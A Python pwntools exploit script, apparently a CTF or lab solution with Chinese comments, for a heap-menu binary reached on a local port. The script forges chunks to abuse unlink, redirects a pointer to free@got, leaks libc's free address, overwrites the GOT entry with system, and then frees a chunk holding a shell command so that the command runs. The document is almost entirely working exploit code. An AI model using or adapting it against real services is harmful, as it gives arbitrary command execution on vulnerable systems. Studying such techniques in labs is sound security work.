# coding: utf-8
#!/usr/bin/env python
#coding:utf8
import socket
import time
from pwn import *

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1',41022)) #服务器端口号需提取


e = ELF('../vul')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

free_libc = libc.symbols['free']
system_libc = libc.symbols['system']
free_got = e.got['free']


def new_sc(sock,sc,lenth):
 sock.send('m')
 sock.recv(1024)
 sock.send(lenth)
 sock.recv(1024)
 sock.send(sc)
 sock.recv(1024)
 

def free_sc(sock,sc):
 sock.send('f')
 sock.recv(1024)
 sock.send(sc)
 sock.recv(1024)

def edit_sc(sock,sc,code):
 sock.send('e')
 sock.recv(1024)
 sock.send(sc)
 sock.recv(1024)
 sock.send(code)
 sock.recv(1024)
 

def print_sc(sock,sc):
 sock.send('p')
 sock.recv(1024)
 sock.send(sc)
 #接收前面的表述信息
 sock.recv(10)
 #由于二进制类型的地址在处理的时候\x00这种会出现问题所以转换为10进制 10进制表示的地址大概就20位  所以这里接收20位  多余的下面会处理
 tt = sock.recv(20)
 return tt


#获取一下未分配变量的bss段地址
sock.recv(1024)
ptr_adr = e.symbols['a'] + 8*2000

#新建3个堆块
new_sc(sock,"aaaaaa","128")
sock.recv(1024)
new_sc(sock,'bbbbbb',"128")
sock.recv(1024)
new_sc(sock,'touch ./output/out.txt',"128")

#构造第一个payload绕过unlink
payload = p64(0)+p64(0x81)+p64(ptr_adr-0x18)+p64(ptr_adr-0x10)+'a'*0x60+p64(0x80)+p64(0x90)
sock.recv(1024)
edit_sc(sock,'0',payload)
sock.recv(1024)
free_sc(sock,'1')

#构造第二个payload让可控地址修改为free@got地址（free函数的got表项地址）
payload2 = p64(0x0)+p64(0x1)+p64(0x8)+p64(free_got)
sock.recv(1024)
edit_sc(sock,'0',payload2)

#获取free函数真实地址
sock.recv(1024)
free_adr = print_sc(sock,'0')
#接收的地址可能后面带有字符类型的多余的接收  这里处理
while not free_adr.isdigit():
    free_adr = free_adr[:-1]
free_adr = int(free_adr)
sock.recv(1024)
new_sc(sock,'free_adr:'+str(free_adr),"128")

#根据偏移量计算system函数真实地址
system_adr = free_adr - free_libc + system_libc

#将free@got的内容改成system函数地址  然后调用一下free函数 此时free函数就是system函数
payload3 = p64(system_adr)[0:8]
sock.recv(1024)
edit_sc(sock,'0',payload3) 
sock.recv(1024)
free_sc(sock,'2')



